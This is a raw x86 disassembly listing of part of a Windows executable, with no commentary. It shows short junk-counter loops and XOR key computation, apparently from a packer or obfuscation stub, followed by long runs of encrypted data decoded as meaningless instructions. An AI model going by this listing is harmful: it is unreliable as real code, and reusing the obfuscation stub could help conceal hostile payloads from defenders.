  402941:	xor    eax,0x825f3f6f
  402946:	shl    DWORD PTR [esi+ebp*1+0x78],1
  40294a:	push   0x88eb5d0a
  40294f:	test   BYTE PTR [ecx],dh
  402951:	adc    al,0x11
  402953:	pusha  
  402954:	(bad)  
  402955:	or     eax,0xc9a2e753
  40295a:	inc    edx
  40295b:	imul   edx
  40295d:	aad    0x21
  40295f:	or     al,0xc2
  402961:	test   BYTE PTR [eax-0x6a],cl
  402964:	fwait
  402965:	push   es
  402966:	push   ecx
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x42fcc176
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xce70707e
  402afd:	and    DWORD PTR [esp+ebp*1],ecx
  402b00:	jl     0x402ab6
  402b02:	pop    ss
  402b03:	mov    ebx,DWORD PTR [eax-0x29]
  402b06:	and    BYTE PTR [edi-0x3b],ah
  402b09:	adc    cl,dl
  402b0b:	adc    DWORD PTR [esi-0x5c899093],edx
  402b11:	(bad)  
  402b12:	shl    BYTE PTR [ebx-0x5c],1
  402b15:	(bad)  
  402b16:	fnsave [eax]
  402b18:	cmc    
  402b19:	mov    bh,0xb2
  402b1b:	out    dx,eax
  402b1c:	mov    esi,0x4de366f5
  402b21:	shl    ebp,0xcb
  402b24:	dec    edi
  402b25:	cs pop edi
  402b27:	jle    0x402b8e
  402b29:	ret    0x5625
  402b2c:	ja     0x402b36
  402b2e:	int    0x6
  402b30:	adc    dl,BYTE PTR [esi]
  402b32:	adc    DWORD PTR [ebx-0x6f],ecx
  402b35:	ins    BYTE PTR es:[edi],dx
  402b36:	xor    eax,0x3e7ec55a
  402b3b:	mov    edi,0x125cf18
  402b40:	push   cs
  402b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b42:	adc    al,0x5a
  402b44:	pop    esp
  402b45:	in     al,dx
  402b46:	ins    BYTE PTR es:[edi],dx
  402b47:	xchg   ebx,eax
  402b48:	popa   
  402b49:	sub    al,BYTE PTR [eax+0x1b]
  402b4c:	add    BYTE PTR [edi-0x5c],bl
  402b4f:	inc    ecx
  402b50:	inc    esi
  402b51:	pavgw  mm6,QWORD PTR [bx-0x7eb]
  402b57:	mov    bl,0x84
  402b59:	push   edx
  402b5a:	stos   DWORD PTR es:[edi],eax
  402b5b:	mov    ebp,ecx
  402b5d:	(bad)  
  402b5e:	cmp    al,0x81
  402b60:	shr    BYTE PTR [edx+edx*4+0x7],0x91
  402b65:	imul   ecx,DWORD PTR [ebx],0x14784d86
  402b6b:	inc    edx
  402b6c:	daa    
  402b6d:	mov    eax,0x546254f0
  402b72:	inc    edx
  402b73:	(bad)  
  402b74:	fcomp  DWORD PTR [ebp+0x6ddb357e]
  402b7a:	lock adc al,0xbc
  402b7d:	jecxz  0x402b3c
  402b7f:	mov    ecx,0x87459512
  402b84:	xchg   ebx,eax
  402b85:	(bad)  
  402b86:	je     0x402b82
  402b88:	lods   al,BYTE PTR ds:[esi]
  402b89:	cmp    DWORD PTR [eax],esi
  402b8b:	pop    esp
  402b8c:	ss loop 0x402b86
  402b8f:	mov    dh,0xd0
  402b91:	add    BYTE PTR [esi+0x7aaa8a68],0xa0
  402b98:	int    0x87
  402b9a:	or     edi,DWORD PTR [edi]
  402b9c:	jbe    0x402bf1
  402b9e:	lds    ecx,FWORD PTR [ecx]
  402ba0:	sbb    ecx,DWORD PTR [ebx]
  402ba2:	out    0xa9,al
  402ba4:	xor    BYTE PTR [eax+0x67],dl
  402ba7:	pop    ebx
  402ba8:	imul   ebx,DWORD PTR [ebx],0xffffffb9
  402bab:	repz sahf 
  402bad:	inc    esi
  402bae:	mov    dh,0x80
  402bb0:	sbb    al,0x71
  402bb2:	rol    BYTE PTR [esp+esi*8],0x2d
  402bb6:	xchg   di,ax
  402bb8:	out    dx,al
  402bb9:	or     dh,al
  402bbb:	pop    ebx
  402bbc:	call   0x3406f545
  402bc1:	(bad)  
  402bc3:	ja     0x402b54
  402bc5:	pop    edx
  402bc6:	mov    DWORD PTR [esi],ecx
  402bc8:	push   esp
  402bc9:	je     0x402bbc
  402bcb:	lea    ebp,[edx]
  402bcd:	ret    
  402bce:	push   cs
  402bcf:	cld    
  402bd0:	dec    ebp
  402bd1:	push   ebx
  402bd2:	int3   
  402bd3:	inc    esi
  402bd4:	shl    BYTE PTR [edx],cl
  402bd6:	add    al,BYTE PTR [ebx-0x5f10ec1c]
  402bdc:	push   ecx
  402bdd:	cmp    BYTE PTR [ebx],dh
  402bdf:	push   ecx
  402be0:	(bad)  [eax-0x3e]
  402be3:	retf   0x26bb
  402be6:	retf   
  402be7:	ret    0x4815
  402bea:	(bad)  
  402beb:	mov    al,0x5d
  402bed:	mov    al,bh
  402bef:	nop    DWORD PTR ds:[esi+0x20b89dff]
  402bf7:	and    eax,0x6816ee10
  402bfc:	cmp    ah,BYTE PTR [edi-0x1c]
  402bff:	(bad)  
  402c00:	mov    eax,0x302d1d49
  402c05:	(bad)  
  402c06:	sub    ch,dh
  402c08:	xchg   esp,eax
  402c09:	add    DWORD PTR [edx+0x3b1d4143],ecx
  402c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c10:	dec    esp
  402c11:	sub    al,0xac
  402c13:	add    DWORD PTR [edi+0x6e0c47b4],ecx
  402c19:	sub    al,0xcb
  402c1b:	sub    esi,DWORD PTR [esi-0x1e]
  402c1e:	jno    0x402c26
  402c20:	loop   0x402c4c
  402c22:	jo     0x402ba8
  402c24:	xlat   BYTE PTR ds:[ebx]
  402c25:	pop    es
  402c26:	add    BYTE PTR [edx-0x7c],dl
  402c29:	icebp  
  402c2a:	sub    DWORD PTR [ecx-0x58d2b1f9],edi
  402c30:	xor    dl,al
  402c32:	and    edx,DWORD PTR [ecx]
  402c34:	and    BYTE PTR ds:0x3b1014a1,bl
  402c3a:	cmp    ch,dl
  402c3c:	fisttp DWORD PTR [eax+0x2ddddf8f]
  402c42:	pop    esi
  402c43:	sbb    dl,bl
  402c45:	cmp    edx,DWORD PTR [esi-0x4]
  402c48:	inc    edx
  402c49:	pop    es
  402c4a:	ficom  DWORD PTR [esi+ebx*2]
  402c4d:	xlat   BYTE PTR ds:[ebx]
  402c4e:	stos   DWORD PTR es:[edi],eax
  402c4f:	aas    
  402c50:	jg     0x402c5b
  402c52:	ds dec esp
  402c54:	cwde   
  402c55:	hlt    
  402c56:	pop    edx
  402c57:	bound  esp,QWORD PTR [edi+0x7]
  402c5a:	nop
  402c5b:	push   ss
  402c5c:	retf   0xb9d1
  402c5f:	sbb    al,0xbc
  402c61:	test   BYTE PTR ds:0xe759ce11,bl
  402c67:	pop    ds
  402c68:	mov    ebp,0x68f3549c
  402c6d:	scas   al,BYTE PTR es:[edi]
  402c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6f:	(bad)  
  402c70:	inc    ebp
  402c71:	mov    ecx,0x74de9e11
  402c76:	das    
  402c77:	pop    esi
  402c78:	mov    DWORD PTR [eax-0x8],ebx
  402c7b:	adc    eax,DWORD PTR ds:0x9dca1331
  402c81:	jmp    0x2cd9:0xb5024c3b
  402c88:	and    cl,cl
  402c8a:	sub    BYTE PTR [eax+0x61],al
  402c8d:	cmp    cl,BYTE PTR [edx-0x19]
  402c90:	adc    ebp,edx
  402c92:	(bad)  
  402c93:	into   
  402c94:	push   es
  402c95:	outs   dx,BYTE PTR ds:[esi]
  402c96:	push   cs
  402c97:	dec    eax
  402c98:	test   eax,0x134241a4
  402c9d:	aaa    
  402c9e:	push   esi
  402c9f:	jp     0x402c63
  402ca1:	enter  0xbb44,0xa0
  402ca5:	xchg   esp,eax
  402ca6:	jae    0x402d26
  402ca8:	jo     0x402c4f
  402caa:	pop    ss
  402cab:	aaa    
  402cac:	and    al,0x25
  402cae:	dec    ebp
  402caf:	mov    bl,0x2c
  402cb1:	gs call 0xd705:0x46c420fe
  402cb9:	sbb    eax,0xd8f13ec5
  402cbe:	cmp    ecx,DWORD PTR [eax+0x48]
  402cc1:	les    ebp,FWORD PTR [eax-0x48]
  402cc4:	pop    ebp
  402cc5:	repz push esp
  402cc7:	es push ss
  402cc9:	fild   WORD PTR [edi]
  402ccb:	mov    al,ds:0x3313adc3
  402cd0:	cld    
  402cd1:	xchg   BYTE PTR [ecx-0x3aa89559],ah
  402cd7:	pop    ss
  402cd8:	cmp    al,0x79
  402cda:	stos   DWORD PTR es:[edi],eax
  402cdb:	(bad)  
  402cdc:	fnstenv [esi]
  402cde:	inc    edx
  402cdf:	inc    ecx
  402ce0:	and    al,0x6f
  402ce2:	and    BYTE PTR [eax+0x64],dl
  402ce5:	adc    eax,0xecbc403e
  402cea:	mov    ?,WORD PTR [ebp+eiz*4-0x6f]
  402cee:	mov    ecx,0xe55ec6c2
  402cf3:	mov    esi,0x27daf2e
  402cf8:	into   
  402cf9:	pop    ecx
  402cfa:	cmp    dl,BYTE PTR [edx]
  402cfc:	cmp    esi,0xffffffda
  402cff:	daa    
  402d00:	loopne 0x402d08
  402d02:	mov    BYTE PTR [esi-0xc],dl
  402d05:	adc    al,BYTE PTR ds:0x87817c54
  402d0b:	pop    DWORD PTR [ecx+0x74]
  402d0e:	fcomp  QWORD PTR [eax+eiz*8-0xe]
  402d12:	(bad)  
  402d13:	das    
  402d14:	mov    ah,0x7
  402d16:	ins    BYTE PTR es:[edi],dx
  402d17:	mov    ds:0x9442b031,eax
  402d1c:	or     edx,esp
  402d1e:	std    
  402d1f:	push   esi
  402d20:	push   ebp
  402d21:	push   edx
  402d22:	mov    edi,DWORD PTR [esi+0x189e42d3]
  402d28:	stos   BYTE PTR es:[edi],al
  402d29:	mov    ecx,0x7f01921e
  402d2e:	dec    esi
  402d2f:	and    ecx,ecx
  402d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d32:	mov    al,ds:0xfb662f24
  402d37:	aad    0x48
  402d39:	mov    eax,ds:0x38c583c3
  402d3e:	clc    
  402d3f:	sub    ebp,0x26
  402d42:	xchg   esi,eax
  402d43:	mov    bl,ah
  402d45:	or     eax,0x4caadc74
  402d4a:	pop    ss
  402d4b:	ins    BYTE PTR es:[edi],dx
  402d4c:	cdq    
  402d4d:	nop
  402d4e:	pushf  
  402d4f:	scas   al,BYTE PTR es:[edi]
  402d50:	ins    DWORD PTR es:[edi],dx
  402d51:	push   ebp
  402d52:	xlat   BYTE PTR ds:[ebx]
  402d53:	pop    ecx
  402d54:	jmp    eax
  402d56:	dec    esp
  402d57:	shl    DWORD PTR ds:0x373e1b81,1
  402d5d:	shl    BYTE PTR [edi+0x6c50b3f2],1
  402d63:	loope  0x402d40
  402d65:	imul   esi,ebp,0x11
  402d68:	call   0xfebf9bac
  402d6d:	mov    eax,0x6459f670
  402d72:	or     al,0x57
  402d74:	jmp    0x9ef719ec
  402d79:	ror    al,0x4b
  402d7c:	inc    edi
  402d7d:	mov    ss,WORD PTR [edx+eax*1-0x4b]
  402d81:	jge    0x402d78
  402d83:	and    BYTE PTR [ecx],ah
  402d85:	ins    DWORD PTR es:[edi],dx
  402d86:	test   eax,0x6cceebf6
  402d8b:	adc    al,0x9e
  402d8d:	pop    ebx
  402d8e:	xor    DWORD PTR ds:0x5190a010,edx
  402d94:	push   edx
  402d95:	xor    BYTE PTR [edi+0x14],al
  402d98:	mov    eax,ds:0x2de5967
  402d9d:	inc    ebx
  402d9e:	mov    ah,0x5
  402da0:	aas    
  402da1:	aaa    
  402da2:	mov    ecx,0xa477f368
  402da7:	and    al,0x1
  402da9:	test   edx,0x9da165ae
  402daf:	je     0x402d59
  402db1:	jbe    0x402d6d
  402db3:	sti    
  402db4:	jbe    0x402dfb
  402db6:	(bad)
  402dba:	lea    ebx,[edx]
  402dbc:	rcl    BYTE PTR [ebx+eax*1],cl
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	fwait
  402de0:	add    DWORD PTR [ebx+0x700abee7],esp
  402de6:	jo     0x402da6
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e4c
  402dec:	test   BYTE PTR [ebx],ch
  402dee:	pop    es
  402def:	and    DWORD PTR [eax],ecx
  402df1:	test   DWORD PTR [ecx+eiz*1-0x68],0x14304132
  402df9:	sbb    ecx,DWORD PTR [esp+ebx*4+0x49]
  402dfd:	cmp    BYTE PTR [edx],bh
  402dff:	mov    eax,ds:0x4010a35e
  402e04:	in     al,0xc9
  402e06:	test   BYTE PTR [edi],0x6b
  402e09:	mov    DWORD PTR [ebx+0x19],esi
  402e0c:	loop   0x402de7
  402e0e:	fs je  0x402e3d
  402e11:	ror    BYTE PTR [eax],0x7a
  402e14:	and    edx,ebx
  402e16:	rcl    DWORD PTR [eax+0x0],cl
  402e19:	dec    bh
  402e1b:	sahf   
  402e1c:	mov    bh,0x3a
  402e1e:	clc    
  402e1f:	scas   eax,DWORD PTR es:[edi]
  402e20:	inc    eax
  402e21:	es loop 0x402e08
  402e24:	lods   al,BYTE PTR ds:[esi]
  402e25:	pop    ds
  402e26:	pop    ebx
  402e27:	dec    eax
  402e28:	mov    edi,0x266a5b2b
  402e2d:	sbb    DWORD PTR [ebx-0x51],edi
  402e30:	js     0x402dce
  402e32:	mov    ecx,0xf1d238a6
  402e37:	lds    eax,FWORD PTR ds:[edi+0x600a432e]
  402e3e:	xor    esp,DWORD PTR [edi-0x74]
  402e41:	and    eax,0x1704cce
  402e46:	clc    
  402e47:	mov    cl,0x38
  402e49:	(bad)
  402e4d:	mov    eax,ds:0x789dd797
  402e52:	sti    
  402e53:	mov    gs,WORD PTR [ecx+0x39]
  402e56:	jnp    0x402eb3
  402e58:	fnsave [edi-0x61bc4bea]
  402e5e:	in     eax,dx
  402e5f:	dec    eax
  402e60:	(bad)  
  402e61:	cmp    edx,ecx
  402e63:	retf   0x1b0b
  402e66:	scas   al,BYTE PTR es:[edi]
  402e67:	sbb    ecx,DWORD PTR [eax+0x6b]
  402e6a:	inc    eax
  402e6b:	and    al,0x9d
  402e6d:	rcr    DWORD PTR gs:[edx+0x29c174d1],cl
  402e74:	mov    ah,0x56
  402e76:	mov    edx,0xe564a8ea
  402e7b:	lock pop esp
  402e7d:	fld    DWORD PTR [si-0x206]
  402e82:	xchg   ebx,eax
  402e83:	icebp  
  402e84:	pop    ds
  402e85:	(bad)  
  402e86:	pop    ecx
  402e87:	fucomi st,st(5)
  402e89:	out    0x87,al
  402e8b:	lahf   
  402e8c:	mov    dl,0xac
  402e8e:	cwde   
  402e8f:	outs   dx,DWORD PTR ds:[esi]
  402e90:	inc    edi
  402e91:	sbb    edx,ebp
  402e93:	arpl   WORD PTR [edi+0x44],bx
  402e96:	pop    ebp
  402e97:	xchg   DWORD PTR [ecx-0x6c],esi
  402e9a:	push   0x99b006e6
  402e9f:	call   0xe0e7:0x7ed40078
  402ea6:	mov    edi,0x3c531511
  402eab:	aas    
  402eac:	jge    0x402f26
  402eae:	das    
  402eaf:	fst    DWORD PTR [ecx-0x71]
  402eb2:	jae    0x402e8e
  402eb4:	adc    ecx,0xd55fe0e
  402eba:	ss in  al,dx
  402ebc:	dec    edi
  402ebd:	loop   0x402ec4
  402ebf:	mov    es,ebx
  402ec1:	inc    ebp
  402ec2:	and    al,0x5c
  402ec4:	push   edx
  402ec5:	or     ebx,DWORD PTR [eax]
  402ec7:	dec    edx
  402ec8:	add    esp,DWORD PTR [edi+ebx*1-0x65]
  402ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ecd:	popf   
  402ece:	retf   0x3c5a
  402ed1:	imul   ebx,DWORD PTR [edi-0x6bf137c2],0xffffffb0
  402ed8:	dec    eax
  402ed9:	pop    ecx
  402eda:	mov    ds:0x4d31ce85,al
  402edf:	int3   
  402ee0:	(bad)  
  402ee1:	je     0x402ec7
  402ee3:	ja     0x402f5c
  402ee5:	mov    WORD PTR [ecx],ss
  402ee7:	cmp    edi,DWORD PTR [edi]
  402ee9:	cmp    eax,eax
  402eeb:	dec    esi
  402eec:	pop    esp
  402eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eee:	sub    eax,0xc980df0
  402ef3:	cmp    al,0xcd
  402ef5:	outs   dx,DWORD PTR ds:[esi]
  402ef6:	cmp    DWORD PTR gs:[edi+edi*2],esp
  402efa:	int3   
  402efb:	adc    BYTE PTR [ecx+0x6c],0x14
  402eff:	inc    edx
  402f00:	pop    edx
  402f01:	adc    dh,ah
  402f03:	and    ch,BYTE PTR [edi+0x1fc2e230]
  402f09:	cmc    
  402f0a:	push   0xdddcb23b
  402f0f:	mov    bh,0xb8
  402f11:	adc    bh,BYTE PTR [eax+0x26c85897]
  402f17:	mov    ecx,0x788f485b
  402f1c:	pushf  
  402f1d:	pop    edi
  402f1e:	int3   
  402f1f:	aam    0x5f
  402f21:	das    
  402f22:	je     0x402f39
  402f24:	ror    BYTE PTR [ebx+eiz*1-0x2d824516],0x49
  402f2c:	in     eax,dx
  402f2d:	mov    al,ds:0x6cfddb58
  402f32:	stos   DWORD PTR es:[edi],eax
  402f33:	sbb    eax,0x91e6a0ca
  402f38:	xchg   ebp,eax
  402f39:	aas    
  402f3a:	in     eax,dx
  402f3b:	push   edi
  402f3c:	in     al,0x80
  402f3e:	nop
  402f3f:	lds    ecx,FWORD PTR [ebx+ecx*4+0x3478b2a6]
  402f46:	sti    
  402f47:	adc    DWORD PTR [edi],0xffffffd4
  402f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f4b:	gs hlt 
  402f4d:	jbe    0x402ee6
  402f4f:	fisubr DWORD PTR [esp+esi*4]
  402f52:	pushf  
  402f53:	ins    BYTE PTR es:[edi],dx
  402f54:	push   ss
  402f55:	xor    BYTE PTR [edi],ah
  402f57:	(bad)  
  402f58:	pop    es
  402f59:	add    al,0xa4
  402f5b:	lds    esp,FWORD PTR [ebx]
  402f5d:	gs pop ecx
  402f5f:	imul   ebx,ebp,0xffffffcf
  402f62:	neg    edx
  402f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f65:	idiv   BYTE PTR [edi-0x35]
  402f68:	cmp    eax,0xc4a441b
  402f6d:	inc    edi
  402f6e:	xlat   BYTE PTR ds:[ebx]
  402f6f:	out    dx,eax
  402f70:	int3   
  402f71:	ret    0xe69b
  402f74:	(bad)  
  402f75:	in     al,dx
  402f76:	sub    eax,0xd87f8789
  402f7b:	adc    eax,0x63d626ca
  402f80:	pop    eax
  402f81:	aam    0x6
  402f83:	pushf  
  402f84:	sub    edi,ecx
  402f86:	pop    eax
  402f87:	pop    eax
  402f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f89:	cmc    
  402f8a:	jmp    0x402fc4
  402f8c:	dec    edi
  402f8d:	sub    BYTE PTR [edx-0x684875a],dh
  402f93:	and    bl,BYTE PTR [edi-0x41ba4297]
  402f99:	add    DWORD PTR [ecx-0xd],edx
  402f9c:	jg     0x402f95
  402f9e:	(bad)  
  402f9f:	adc    bl,BYTE PTR [ebx]
  402fa1:	xor    al,0x4b
  402fa3:	cmp    eax,0x5dc19b81
  402fa8:	icebp  
  402fa9:	mov    eax,ds:0xd9a20aa0
  402fae:	sbb    ah,BYTE PTR fs:[esi]
  402fb1:	add    BYTE PTR [eax+eax*8],dh
  402fb4:	std    
  402fb5:	addr16 daa 
  402fb7:	sti    
  402fb8:	int    0xe0
  402fba:	mov    al,ds:0x94a5ae0b
  402fbf:	call   0x87517504
  402fc4:	mov    bh,0x3f
  402fc6:	sub    BYTE PTR [esi-0x38a47b74],bl
  402fcc:	cmp    DWORD PTR [ecx+0x61db566d],esp
  402fd2:	push   esi
  402fd3:	pop    edx
  402fd4:	test   BYTE PTR [edx-0xa],0xae
  402fd8:	(bad)  
  402fd9:	and    al,0xb8
  402fdb:	mov    ecx,DWORD PTR [edi]
  402fdd:	jmp    0x403051
  402fdf:	push   ds
  402fe0:	xchg   ah,cl
  402fe2:	push   0xffffffed
  402fe4:	xchg   ebp,eax
  402fe5:	xchg   edi,eax
  402fe6:	lahf   
  402fe7:	sar    esp,1
  402fe9:	push   eax
  402fea:	pop    edi
  402feb:	retf   0xb880
  402fee:	xchg   esp,eax
  402fef:	sbb    DWORD PTR [ecx-0x6f],ecx
  402ff2:	test   eax,0xb773833e
  402ff7:	inc    esp
  402ff8:	and    dh,BYTE PTR [ecx]
  402ffa:	(bad)  
  402ffb:	pop    ecx
  402ffc:	pop    ebp
  402ffd:	das    
  402ffe:	mov    al,ds:0xb064b0e6
  403003:	mov    bl,0x1c
  403005:	int3   
  403006:	retf   
  403007:	test   eax,0xd66ddc84
  40300c:	jns    0x402ff7
  40300e:	inc    ebx
  40300f:	scas   al,BYTE PTR es:[edi]
  403010:	aad    0x65
  403012:	push   esp
  403013:	fsub   DWORD PTR [edi]
  403015:	adc    BYTE PTR [edi-0x57],0xf9
  403019:	sbb    ch,BYTE PTR [edx-0x58]
  40301c:	aas    
  40301d:	and    DWORD PTR [eax+0xd],0xffffffb5
  403021:	mov    ?,WORD PTR [ecx+0x5a]
  403024:	out    dx,al
  403025:	fidivr WORD PTR [ebx+0x64cba07f]
  40302b:	adc    edi,DWORD PTR [edi]
  40302d:	add    DWORD PTR ds:0x7677b1e2,esi
  403033:	cli    
  403034:	or     bh,ch
  403036:	(bad)  
  403037:	jecxz  0x4030a8
  403039:	inc    esi
  40303a:	push   esi
  40303b:	and    al,0x9e
  40303d:	test   al,0xf6
  40303f:	clc    
  403040:	out    dx,al
  403041:	lock pop es
  403043:	iret   
  403044:	dec    edx
  403045:	popf   
  403046:	or     al,0x95
  403048:	mov    WORD PTR [ebx],?
  40304a:	fucom  st(6)
  40304c:	add    ch,BYTE PTR [edi-0x7fe42c93]
  403052:	neg    BYTE PTR [esi-0x4939cc2d]
  403058:	mov    eax,ds:0x68bc039
  40305d:	daa    
  40305e:	push   ecx
  40305f:	cli    
  403060:	jp     0x403062
  403062:	cmp    al,0x9a
  403064:	mov    ah,0x63
  403066:	mov    DWORD PTR [edi],0xec3a170e
  40306c:	sbb    dl,dh
  40306e:	mov    WORD PTR [ebp*4-0x6e6c2dce],es
  403075:	dec    esp
  403076:	fisub  DWORD PTR [esi-0x19]
  403079:	mov    dh,0x64
  40307b:	imul   ah
  40307d:	fld    TBYTE PTR [esi+0x31]
  403080:	hlt    
  403081:	cmp    DWORD PTR [edi+ebp*8+0x32b03cf3],esi
  403088:	popa   
  403089:	inc    edx
  40308a:	(bad)  
  40308b:	scas   eax,DWORD PTR es:[edi]
  40308c:	sub    ah,dl
  40308e:	sub    edx,DWORD PTR [ebx]
  403090:	ret    
  403091:	das    
  403092:	outs   dx,BYTE PTR ds:[esi]
  403093:	jle    0x4030b7
  403095:	jle    0x403058
  403097:	sahf   
  403098:	test   al,0x62
  40309a:	les    ecx,FWORD PTR [esi-0x2d]
  40309d:	fwait
  40309e:	jg     0x403114
  4030a0:	jle    0x4030ef
  4030a2:	pop    ss
  4030a3:	cld    
  4030a4:	cli    
  4030a5:	push   ds
  4030a6:	cld    
  4030a7:	lods   al,BYTE PTR ds:[esi]
  4030a8:	xchg   ebp,eax
  4030a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030aa:	int3   
  4030ab:	into   
  4030ac:	pop    esi
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x6e
  4030ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030cf:	add    ebx,DWORD PTR [ebx]
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x3170707e
  4030da:	loop   0x403077
  4030dc:	xor    edi,eax
  4030de:	jg     0x403117
  4030e0:	jecxz  0x40308e
  4030e2:	addr16 in al,0x7d
  4030e5:	jl     0x4030b1
  4030e7:	inc    edx
  4030e8:	in     eax,dx
  4030e9:	pop    ecx
  4030ea:	pop    ds
  4030eb:	enter  0x4fd6,0xc1
  4030ef:	out    dx,al
  4030f0:	(bad)  
  4030f1:	ret    0x38a8
  4030f4:	aas    
  4030f5:	pop    es
  4030f6:	add    al,0xd1
  4030f8:	test   eax,0x997ed903
  4030fd:	clc    
  4030fe:	fistp  WORD PTR [ebx+0x69]
  403101:	sbb    al,0x46
  403103:	push   ecx
  403104:	add    eax,0x3e84a13c
  403109:	das    
  40310a:	int    0x2d
  40310c:	xchg   esp,eax
  40310d:	mov    ebx,ss
  40310f:	pushf  
  403110:	sbb    bl,bl
  403112:	jmp    0x2303:0x9f7b9380
  403119:	push   ebx
  40311a:	rol    DWORD PTR [edx],cl
  40311c:	mov    DWORD PTR [ebx+0x23dd02a3],ebx
  403122:	mov    esp,0x69f2c2c9
  403127:	iret   
  403128:	aas    
  403129:	inc    esi
  40312a:	lea    edx,[ebx-0x60d9a0cc]
  403130:	outs   dx,BYTE PTR ds:[esi]
  403131:	pop    edi
  403132:	xlat   BYTE PTR ds:[ebx]
  403133:	mov    esp,0x26a2925
  403138:	sbb    esp,DWORD PTR ds:0x1cf1e7e2
  40313e:	xchg   edx,eax
  40313f:	mov    ebx,0xc85cde89
  403144:	jecxz  0x403108
  403146:	add    al,0x6a
  403148:	xchg   edi,eax
  403149:	mov    ch,0x85
  40314b:	data16 sub bh,BYTE PTR [ecx+0x20572142]
  403152:	fistp  QWORD PTR [edi]
  403154:	push   cs
